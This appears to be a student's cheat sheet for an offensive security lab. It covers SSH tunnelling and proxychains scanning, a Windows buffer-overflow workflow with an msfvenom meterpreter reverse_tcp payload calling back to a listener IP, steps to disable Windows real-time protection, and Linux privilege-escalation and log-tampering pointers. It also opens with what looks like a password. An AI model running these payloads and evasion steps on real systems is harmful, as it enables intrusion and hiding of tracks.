KEPE-006-M
jTlU99dknad4D95

Tunnels
ssh -MS /tmp/gray student@10.50.46.234
ssh -S /tmp/gray gray -O forward -D9050
ssh -S /tmp/gray 10 -O forward -L 1700:192.168.28.27:22

for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done
proxychains nmap -v -sT -Pn -T4 -sV 192.168.28.129,112,113,114 
-p-[all ports] -p[22,23]


ssh www-data@0.0.0.0 -p 1460 -L 1400:192.168.150.253:3201 -NT



Windows Buffer Overflow
Break program with tcpcon.py

Open Immunity debuger CPU window and exe as administrator
Attach file in cpu window
Generate Buffer overflow pattern https://wiremask.eu/tools/buffer-overflow-pattern-generator/
Copy EIP to find where the error happens
add DEADCODE to buff in script
mona modules -o
imona jmp -r esp -m "<file>"
find jmp esp instruction memory address
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.46.234 lport=4444 -b
msfconsole -q
use exploit/multi/handler

set payload windows/meterpreter/reverse_tcp
show options, set lhost, set lport
shut off real time protection in windows-> security -> vires and threat -> mange settings -> real-time protection





Privilege Escalation,P Persistence and Covering your Tracks
sudo -l (list user permissions)
/var/log/ auth.log/secure (login/authen) lastlog(successful login time) btmp(bad login) sulog(SU command) utmp(W command) wtmp(permanent record on user)

find /var/log -type f -mmin -10 2> /dev/null

msfvenom -p linux/x86/exec CMD="sudo cat /.secret/.verysecret.pdb" -b '\x00' -f python
